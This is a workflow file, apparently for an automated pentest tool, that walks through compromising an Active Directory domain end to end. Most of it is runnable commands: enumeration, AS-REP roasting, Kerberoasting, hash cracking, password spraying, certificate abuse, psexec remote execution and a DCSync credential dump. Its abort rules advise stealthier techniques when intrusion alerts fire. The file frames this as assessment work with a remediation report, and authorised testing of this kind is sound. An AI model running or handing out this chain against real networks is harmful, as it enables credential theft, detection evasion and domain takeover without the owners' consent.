# Workflow: Active Directory Attack Chain

**ID:** 06_ad_attack_chain
**Risk Level:** HIGH — Active credential attacks, domain compromise
**Estimated Duration:** 30-120 minutes
**Requires:** Network access to DC, valid domain credentials (for most steps)

## Objective

Enumerate, attack, and compromise an Active Directory domain through
a methodical escalation chain from initial foothold to domain admin.

## Pre-Flight Checks

1. **DC reachable (SMB + LDAP):**

    ```bash
    nmap -p 88,135,139,389,445,636 DC_IP
    ```

2. **Tools available:**
    ```bash
    which enum4linux-ng smbmap bloodhound-python impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump nxc
    ```

## Phase A: Enumeration

### Step 1: AD Enumeration

```bash
npx tsx tactical/modules/module_runner.ts ad_enum \
  --target DC_IP --tool both
```

Null session first. If access denied, use creds:

```bash
npx tsx tactical/modules/module_runner.ts ad_enum \
  --target DC_IP --username USER --password PASS --domain DOMAIN
```

### Step 2: LDAP Deep Enumeration

```bash
npx tsx tactical/modules/module_runner.ts ldap_enum \
  --target DC_IP --domain corp.local --username 'DOMAIN\user' --password PASS --query all
```

**Key targets:** Users with adminCount=1, accounts with SPNs, delegation configs.

### Step 3: SMB Share Mapping

```bash
npx tsx tactical/modules/module_runner.ts smb_mapper \
  --host DC_IP --username USER --password PASS --domain DOMAIN --recurse
```

**Look for:** SYSVOL/NETLOGON scripts with hardcoded creds, writable shares.

### Step 4: BloodHound Collection

```bash
npx tsx tactical/modules/module_runner.ts bloodhound_collector \
  --domain corp.local --username USER --password PASS --dc-ip DC_IP --collection All
```

## Phase B: Credential Attacks

### Step 5: AS-REP Roasting (no auth needed)

```bash
npx tsx tactical/modules/module_runner.ts kerberos_attack \
  --domain corp.local --dc-ip DC_IP --attack asrep --users-file users.txt
```

### Step 6: Kerberoasting (requires auth)

```bash
npx tsx tactical/modules/module_runner.ts kerberos_attack \
  --domain corp.local --dc-ip DC_IP --attack kerberoast \
  --username USER --password PASS --output-file kerberoast.txt
```

### Step 7: Crack Captured Hashes

```bash
npx tsx tactical/modules/module_runner.ts hash_cracker \
  --hash-file kerberoast.txt --tool john --format krb5tgs
```

### Step 8: Password Spraying

```bash
npx tsx tactical/modules/module_runner.ts credential_sprayer \
  --target DC_IP --protocol smb --username-file users.txt \
  --password "Summer2026!" --domain corp.local
```

## Phase C: Exploitation

### Step 9: AD Certificate Exploitation

```bash
npx tsx tactical/modules/module_runner.ts ad_cert_exploit \
  --target DC_IP --domain corp.local --username USER --password PASS --action find
```

### Step 10: Remote Execution

```bash
npx tsx tactical/modules/module_runner.ts remote_exec \
  --target HOST_IP --username ADMIN --password PASS --domain DOMAIN \
  --method psexec --command "whoami /all"
```

### Step 11: DCSync (Domain Admin required)

```bash
npx tsx tactical/modules/module_runner.ts credential_dump \
  --target "DOMAIN/admin:password@DC_IP" --just-dc-ntlm
```

## Abort Conditions

- Account lockout detected (reduce spray speed or stop)
- IDS/IPS alerts (switch to stealthier techniques)
- Lost network access to DC
- 3 consecutive failures

## Reporting

Summarize:

- Domain: name, functional level, trust relationships
- Users enumerated: total, admins, SPN accounts, AS-REP vulnerable
- Shares: writable shares, sensitive files found
- Hashes captured: AS-REP, Kerberoast, cracked passwords
- Credential spray: valid credentials found
- Certificate vulns: ESC findings
- Domain admin achieved: yes/no, method used
- Recommendations: remediation steps for each finding
